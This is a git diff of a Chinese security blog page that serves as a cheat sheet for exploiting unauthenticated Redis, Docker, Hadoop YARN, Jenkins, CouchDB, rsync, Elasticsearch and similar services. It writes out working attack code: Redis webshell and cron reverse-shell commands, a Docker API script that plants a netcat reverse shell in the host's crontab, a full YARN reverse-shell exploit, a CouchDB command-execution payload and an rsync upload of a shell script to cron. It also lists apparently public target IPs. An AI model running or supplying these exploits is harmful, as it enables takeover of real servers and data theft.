@@ -7,18 +7,18 @@
   
   <title>常见组件未授权访问漏洞利用 | thinks blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="感谢大佬的总结 https://xz.aliyun.com/t/6103 简单总结下漏洞利用方式 Redis 未授权访问漏洞1. 写webshell 1234config set dir /var/www/htmlconfig set fbfilename test.phpconfig set webshell &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;save">
+  <meta name="description" content="简单总结下常见组件未授权访问漏洞利用方式">
 <meta name="keywords" content="web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="常见组件未授权访问漏洞利用">
 <meta property="og:url" content="http://yoursite.com/2019/08/28/常见组件未授权访问漏洞利用/index.html">
 <meta property="og:site_name" content="thinks blog">
-<meta property="og:description" content="感谢大佬的总结 https://xz.aliyun.com/t/6103 简单总结下漏洞利用方式 Redis 未授权访问漏洞1. 写webshell 1234config set dir /var/www/htmlconfig set fbfilename test.phpconfig set webshell &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;save">
+<meta property="og:description" content="简单总结下常见组件未授权访问漏洞利用方式">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-29T02:44:23.808Z">
+<meta property="og:updated_time" content="2019-08-29T02:53:13.345Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="常见组件未授权访问漏洞利用">
-<meta name="twitter:description" content="感谢大佬的总结 https://xz.aliyun.com/t/6103 简单总结下漏洞利用方式 Redis 未授权访问漏洞1. 写webshell 1234config set dir /var/www/htmlconfig set fbfilename test.phpconfig set webshell &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;save">
+<meta name="twitter:description" content="简单总结下常见组件未授权访问漏洞利用方式">
   
     <link rel="alternate" href="/atom.xml" title="thinks blog" type="application/atom+xml">
   
@@ -87,53 +87,104 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>感谢大佬的总结 <a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></p>
-<p>简单总结下漏洞利用方式</p>
+        <p>简单总结下常见组件未授权访问漏洞利用方式</p>
+<a id="more"></a>
+
+<p>感谢大佬的总结 <a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></p>
 <h2 id="Redis-未授权访问漏洞"><a href="#Redis-未授权访问漏洞" class="headerlink" title="Redis 未授权访问漏洞"></a>Redis 未授权访问漏洞</h2><pre><code>1. 写webshell
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set fbfilename test.php</span><br><span class="line">config set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
+config set dir /var/www/html
+config set fbfilename test.php
+config set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;
+save
 2. 写crontab反弹shell
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.18.138</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.15.3/5555 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
+redis-cli.exe -h 192.168.18.138
+config set dir /var/spool/cron
+set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.15.3/5555 0&gt;&amp;1\n\n\n&quot;
+config set dbfilename root
+save
 3.Redis 基于主从复制的 RCE
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/975/</span><br></pre></td></tr></table></figure></code></pre><h2 id="MongoDB-未授权访问漏洞"><a href="#MongoDB-未授权访问漏洞" class="headerlink" title="MongoDB 未授权访问漏洞"></a>MongoDB 未授权访问漏洞</h2><pre><code>直接连接，泄露敏感信息，增删查改
+https://paper.seebug.org/975/</code></pre><h2 id="MongoDB-未授权访问漏洞"><a href="#MongoDB-未授权访问漏洞" class="headerlink" title="MongoDB 未授权访问漏洞"></a>MongoDB 未授权访问漏洞</h2><pre><code>直接连接，泄露敏感信息，增删查改
 使用 NoSQLBooster 连接
 下载地址：https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe</code></pre><h2 id="Jenkins-未授权访问漏洞"><a href="#Jenkins-未授权访问漏洞" class="headerlink" title="Jenkins 未授权访问漏洞"></a>Jenkins 未授权访问漏洞</h2><pre><code>http://www.secpulse.com:8080/manage
 http://www.secpulse.com:8080/script
 点击 &quot;脚本命令执行&quot; 
-可执行系统命令
-<figure class="highlight plain"><figcaption><span>"whoami".execute().text ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写文件</span><br><span class="line">``` new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;);</span><br></pre></td></tr></table></figure></code></pre><h2 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h2><pre><code>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。
+可执行系统命令 println &quot;whoami&quot;.execute().tex
+写文件 new File (&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php phpinfo(); ?&gt;&apos;)</code></pre><h2 id="Memcached-未授权访问漏洞"><a href="#Memcached-未授权访问漏洞" class="headerlink" title="Memcached 未授权访问漏洞"></a>Memcached 未授权访问漏洞</h2><pre><code>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。
 测试漏洞：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.0.4.138 11211 或 nc -vv &lt;target&gt; 11211</span><br><span class="line">无需用户名密码，可以直接连接memcache 服务的11211端口</span><br></pre></td></tr></table></figure></code></pre><h2 id="JBOSS-未授权访问漏洞"><a href="#JBOSS-未授权访问漏洞" class="headerlink" title="JBOSS 未授权访问漏洞"></a>JBOSS 未授权访问漏洞</h2><pre><code>默认情况下访问 http://ip:8080/jmx-console 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马
+telnet 10.0.4.138 11211 或 nc -vv &lt;target&gt; 11211
+无需用户名密码，可以直接连接memcache 服务的11211端口</code></pre><h2 id="JBOSS-未授权访问漏洞"><a href="#JBOSS-未授权访问漏洞" class="headerlink" title="JBOSS 未授权访问漏洞"></a>JBOSS 未授权访问漏洞</h2><pre><code>默认情况下访问 http://ip:8080/jmx-console 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马
 EXP: https://www.exploit-db.com/exploits/36575</code></pre><h2 id="Docker-未授权访问漏洞"><a href="#Docker-未授权访问漏洞" class="headerlink" title="Docker 未授权访问漏洞"></a>Docker 未授权访问漏洞</h2><pre><code>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。
 通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，
 我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">未授权访问测试： docker -H tcp://192.168.15.5:2375 version</span><br><span class="line">通过crontab反弹宿主机shell</span><br><span class="line"></span><br><span class="line"># vps监听9999端口</span><br><span class="line">nc -lvnp 9999</span><br><span class="line"></span><br><span class="line"># 启动容器，并挂载本地/etc/crontabs目录</span><br><span class="line">docker -H tcp://192.168.15.5:2375 run -id -v /etc/crontabs:/tmp alpine:latest</span><br><span class="line">docker -H tcp://192.168.15.5:2375 ps</span><br><span class="line"></span><br><span class="line">docker -H tcp://192.168.15.5:2375 exec -it a8ff7ed880fb sh # 进入容器</span><br><span class="line"></span><br><span class="line">#写计划任务反弹shell</span><br><span class="line">echo &apos;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&apos; &gt;&gt; /tmp/root #添加计划任务</span><br><span class="line">cat /tmp/root # 查看/tmp/root 文件</span><br><span class="line">exit #退出容器</span><br></pre></td></tr></table></figure>
+未授权访问测试： docker -H tcp://192.168.15.5:2375 version
+通过crontab反弹宿主机shell
 
+# vps监听9999端口
+nc -lvnp 9999
+
+# 启动容器，并挂载本地/etc/crontabs目录
+docker -H tcp://192.168.15.5:2375 run -id -v /etc/crontabs:/tmp alpine:latest
+docker -H tcp://192.168.15.5:2375 ps
+
+docker -H tcp://192.168.15.5:2375 exec -it a8ff7ed880fb sh # 进入容器
+
+#写计划任务反弹shell
+echo &apos;* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh&apos; &gt;&gt; /tmp/root #添加计划任务
+cat /tmp/root # 查看/tmp/root 文件
+exit #退出容器
 利用的python脚本：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line">client = docker.DockerClient(base_url=&apos;http://&#123;target_ip&#125;:2375/&apos;)</span><br><span class="line">data = client.containers.run(&apos;alpine:latest&apos;, r&apos;&apos;&apos;sh -c &quot;echo &apos;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&apos; &gt;&gt; /tmp/etc/crontabs/root&quot; &apos;&apos;&apos;, remove=True, volumes=&#123;&apos;/etc&apos;: &#123;&apos;bind&apos;: &apos;/tmp/etc&apos;, &apos;mode&apos;: &apos;rw&apos;&#125;&#125;)</span><br></pre></td></tr></table></figure>
-
+import docker
+client = docker.DockerClient(base_url=&apos;http://{target_ip}:2375/&apos;)
+data = client.containers.run(&apos;alpine:latest&apos;, r&apos;&apos;&apos;sh -c &quot;echo &apos;* * * * * /usr/bin/nc {vps_ip} 9999 -e /bin/sh&apos; &gt;&gt; /tmp/etc/crontabs/root&quot; &apos;&apos;&apos;, remove=True, volumes={&apos;/etc&apos;: {&apos;bind&apos;: &apos;/tmp/etc&apos;, &apos;mode&apos;: &apos;rw&apos;}})
 https://github.com/Tycx2ry/docker_api_vul</code></pre><h2 id="ZooKeeper-未授权访问漏洞"><a href="#ZooKeeper-未授权访问漏洞" class="headerlink" title="ZooKeeper 未授权访问漏洞"></a>ZooKeeper 未授权访问漏洞</h2><pre><code>Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，
 造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。
 攻击者能够执行所有只允许由管理员运行的命令
-测试漏洞：
-<figure class="highlight plain"><figcaption><span>envi | nc ip port ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接连接：</span><br><span class="line">``` ./zkCli.sh -server ip:port</span><br></pre></td></tr></table></figure></code></pre><h2 id="Rsync-未授权访问漏洞"><a href="#Rsync-未授权访问漏洞" class="headerlink" title="Rsync 未授权访问漏洞"></a>Rsync 未授权访问漏洞</h2><pre><code>Rsync（remote synchronize）是一个远程数据同步工具，
+测试漏洞： echo envi | nc ip por
+直接连接： ./zkCli.sh -server ip:por</code></pre><h2 id="Rsync-未授权访问漏洞"><a href="#Rsync-未授权访问漏洞" class="headerlink" title="Rsync 未授权访问漏洞"></a>Rsync 未授权访问漏洞</h2><pre><code>Rsync（remote synchronize）是一个远程数据同步工具，
 可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。
 Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837
 
 未授权访问测试 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#rsync rsync://&#123;target_ip&#125;/</span><br><span class="line">rsync rsync://172.16.2.250:873/</span><br><span class="line">rsync rsync://172.16.2.250:873/src</span><br><span class="line"></span><br><span class="line">#下载文件</span><br><span class="line">rsync rsync://172.16.2.250:873/src/etc/passwd ./</span><br><span class="line"></span><br><span class="line">#上传文件， 上传nc.sh 到 cron.hourly</span><br><span class="line">rsync -av nc.sh rsync://172.16.2.250:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure></code></pre><h2 id="CouchDB-未授权访问漏洞"><a href="#CouchDB-未授权访问漏洞" class="headerlink" title="CouchDB 未授权访问漏洞"></a>CouchDB 未授权访问漏洞</h2><pre><code>Apache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。
+#rsync rsync://{target_ip}/
+rsync rsync://172.16.2.250:873/
+rsync rsync://172.16.2.250:873/src
+
+#下载文件
+rsync rsync://172.16.2.250:873/src/etc/passwd ./
+
+#上传文件， 上传nc.sh 到 cron.hourly
+rsync -av nc.sh rsync://172.16.2.250:873/src/etc/cron.hourly</code></pre><h2 id="CouchDB-未授权访问漏洞"><a href="#CouchDB-未授权访问漏洞" class="headerlink" title="CouchDB 未授权访问漏洞"></a>CouchDB 未授权访问漏洞</h2><pre><code>Apache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。
 它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。
 应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,
 默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。
 其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">未授权访问测试</span><br><span class="line">curl http://192.168.18.129:5984</span><br><span class="line">curl http://192.168.18.129:5984/_config</span><br><span class="line"></span><br><span class="line">命令执行</span><br><span class="line">curl -X PUT &apos;http://192.168.18.129:5984/_config/query_servers/cmd&apos; -d &apos;&quot;curl http://192.168.18.138:9999/test.php&quot;&apos;</span><br></pre></td></tr></table></figure></code></pre><h2 id="Elasticsearch-未授权访问漏洞"><a href="#Elasticsearch-未授权访问漏洞" class="headerlink" title="Elasticsearch 未授权访问漏洞"></a>Elasticsearch 未授权访问漏洞</h2><pre><code>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。
+未授权访问测试
+curl http://192.168.18.129:5984
+curl http://192.168.18.129:5984/_config
+
+命令执行
+curl -X PUT &apos;http://192.168.18.129:5984/_config/query_servers/cmd&apos; -d &apos;&quot;curl http://192.168.18.138:9999/test.php&quot;&apos;</code></pre><h2 id="Elasticsearch-未授权访问漏洞"><a href="#Elasticsearch-未授权访问漏洞" class="headerlink" title="Elasticsearch 未授权访问漏洞"></a>Elasticsearch 未授权访问漏洞</h2><pre><code>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。
 Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。
 Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。
 该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。
 Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">未授权访问测试</span><br><span class="line">curl http://localhost:9200/_nodes #查看节点数据</span><br><span class="line"></span><br><span class="line">调用api，进行数据的增删改操作。</span><br><span class="line">http://x.x.x.x:9200/_nodes</span><br><span class="line">http://x.x.x.x:9200/_river</span><br><span class="line"></span><br><span class="line">一些利用url</span><br><span class="line">http://101.198.161.130:9200/_cat/indices/</span><br><span class="line">http://101.198.161.130:9200/_plugin/head/</span><br><span class="line">http://101.198.161.130:9200/_nodes</span><br><span class="line">http://101.198.161.130:9200/_nodes?prettify</span><br><span class="line">http://101.198.161.130:9200/_status</span><br><span class="line">http://101.198.161.130:9200/_search?pretty</span><br><span class="line">http://10.203.9.131:9200/zjftu/</span><br><span class="line">http://10.203.9.131:9200/zjftu/_search?pretty</span><br></pre></td></tr></table></figure></code></pre><h2 id="Hadoop-未授权访问漏洞"><a href="#Hadoop-未授权访问漏洞" class="headerlink" title="Hadoop 未授权访问漏洞"></a>Hadoop 未授权访问漏洞</h2><pre><code>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，
+未授权访问测试
+curl http://localhost:9200/_nodes #查看节点数据
+
+调用api，进行数据的增删改操作。
+http://x.x.x.x:9200/_nodes
+http://x.x.x.x:9200/_river
+
+一些利用url
+http://101.198.161.130:9200/_cat/indices/
+http://101.198.161.130:9200/_plugin/head/
+http://101.198.161.130:9200/_nodes
+http://101.198.161.130:9200/_nodes?prettify
+http://101.198.161.130:9200/_status
+http://101.198.161.130:9200/_search?pretty
+http://10.203.9.131:9200/zjftu/
+http://10.203.9.131:9200/zjftu/_search?pretty</code></pre><h2 id="Hadoop-未授权访问漏洞"><a href="#Hadoop-未授权访问漏洞" class="headerlink" title="Hadoop 未授权访问漏洞"></a>Hadoop 未授权访问漏洞</h2><pre><code>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，
 黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。
 
 未授权访问测试
@@ -144,7 +195,26 @@ Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常�
 在本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交
 
 python EXP:
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &apos;http://192.168.18.129:8088/&apos;</span><br><span class="line">lhost = &apos;192.168.18.138&apos; # put your local host ip here, and listen at port 9999</span><br><span class="line">url = target + &apos;ws/v1/cluster/apps/new-application&apos;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&apos;application-id&apos;]</span><br><span class="line">url = target + &apos;ws/v1/cluster/apps&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;application-id&apos;: app_id,</span><br><span class="line">    &apos;application-name&apos;: &apos;get-shell&apos;,</span><br><span class="line">    &apos;am-container-spec&apos;: &#123;</span><br><span class="line">        &apos;commands&apos;: &#123;</span><br><span class="line">            &apos;command&apos;: &apos;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&apos; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;application-type&apos;: &apos;YARN&apos;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure></code></pre><h2 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h2><pre><code>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
+#!/usr/bin/env python
+import requests
+
+target = &apos;http://192.168.18.129:8088/&apos;
+lhost = &apos;192.168.18.138&apos; # put your local host ip here, and listen at port 9999
+url = target + &apos;ws/v1/cluster/apps/new-application&apos;
+resp = requests.post(url)
+app_id = resp.json()[&apos;application-id&apos;]
+url = target + &apos;ws/v1/cluster/apps&apos;
+data = {
+    &apos;application-id&apos;: app_id,
+    &apos;application-name&apos;: &apos;get-shell&apos;,
+    &apos;am-container-spec&apos;: {
+        &apos;commands&apos;: {
+            &apos;command&apos;: &apos;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&apos; % lhost,
+        },
+    },
+    &apos;application-type&apos;: &apos;YARN&apos;,
+}
+requests.post(url, json=data)</code></pre><h2 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h2><pre><code>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
 如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，
 游客可在其中创建一个console并执行任意Python代码和命令。
 
@@ -152,7 +222,13 @@ python EXP:
 访问 http://192.168.18.129:8888
 利用terminal命令执行
 New &gt; Terminal 创建控制台</code></pre><h2 id="VNC-未授权访问漏洞"><a href="#VNC-未授权访问漏洞" class="headerlink" title="VNC 未授权访问漏洞"></a>VNC 未授权访问漏洞</h2><pre><code>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</code></pre><h2 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h2><pre><code>任意用户注册后可查看，下载项目内容</code></pre><h2 id="Atlassian-Crowd-未授权访问漏洞"><a href="#Atlassian-Crowd-未授权访问漏洞" class="headerlink" title="Atlassian Crowd 未授权访问漏洞"></a>Atlassian Crowd 未授权访问漏洞</h2><pre><code>攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">未授权访问测试</span><br><span class="line">进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</span><br><span class="line"></span><br><span class="line">curl --form &quot;file_cdl=@applinks-plugin-5.4.12.jar&quot; http://192.168.18.138:8095/crowd/admin/uploadplugin.action -v</span><br><span class="line"></span><br><span class="line">Atlassian Crowd RCE</span><br><span class="line">漏洞利用脚本github地址：https://github.com/jas502n/CVE-2019-11580</span><br></pre></td></tr></table></figure></code></pre>
+未授权访问测试
+进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar
+
+curl --form &quot;file_cdl=@applinks-plugin-5.4.12.jar&quot; http://192.168.18.138:8095/crowd/admin/uploadplugin.action -v
+
+Atlassian Crowd RCE
+漏洞利用脚本github地址：https://github.com/jas502n/CVE-2019-11580</code></pre>
       
     </div>
     <footer class="article-footer">
